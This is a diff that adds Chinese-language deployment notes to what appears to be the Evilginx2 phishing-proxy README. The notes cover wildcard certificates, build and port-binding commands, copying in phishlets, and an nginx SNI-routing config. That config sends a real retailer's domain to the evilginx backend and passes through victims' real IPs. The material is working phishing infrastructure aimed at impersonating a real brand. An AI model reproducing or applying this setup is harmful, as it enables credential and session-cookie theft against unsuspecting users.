@@ -1,3 +1,63 @@
+域名准备：
+直接配置cf， 然后设置通配符域名
+服务器申请通配符域名
+
+证书放到evilginx下面
+~/.evilginx/certs/sites/xxx.com
+fullchain.pem  privkey.pem(名字保持不变)
+
+
+
+evilginx部署
+1. install go  nodejs
+2. git clone
+3. make
+4. setcap CAP_NET_BIND_SERVICE=+eip ./build/evilginx
+5. cp phishlets  redirectors
+6. ./evilginx 
+
+[## nginx配置
+
+    stream {
+
+        map $ssl_preread_server_name $backend {
+            ~^(.+\.)?supercake2026\.com$   web;
+            ~^(.+\.)?chemicalguys\.com$        evilginx;
+    
+        }
+        upstream evilginx {
+            server 127.0.0.1:18443;
+        }
+        upstream web {
+            server 127.0.0.1:8443;
+        }
+    
+        server {
+            listen 443;
+            proxy_pass $backend;
+            ssl_preread on;
+            proxy_protocol on;                    # 重要！让 Evi 获取真实 IP
+            proxy_connect_timeout 10s;
+            proxy_timeout 5m;
+        }
+    }]()
+
+**注意， web服务的话要加个这个： 因为stream加了：proxy_protocol  on;**
+
+    server {
+        listen       80;
+        listen      8443 ssl **proxy_protocol**;
+        server_name  web3.supercake2026.com;
+    
+        set_real_ip_from 127.0.0.1;
+        real_ip_header **proxy_protocol**;
+
+
+
+
+
+
+
 <p align="center">
   <img alt="Evilginx2 Logo" src="https://raw.githubusercontent.com/kgretzky/evilginx2/master/media/img/evilginx2-logo-512.png" height="160" />
   <p align="center">
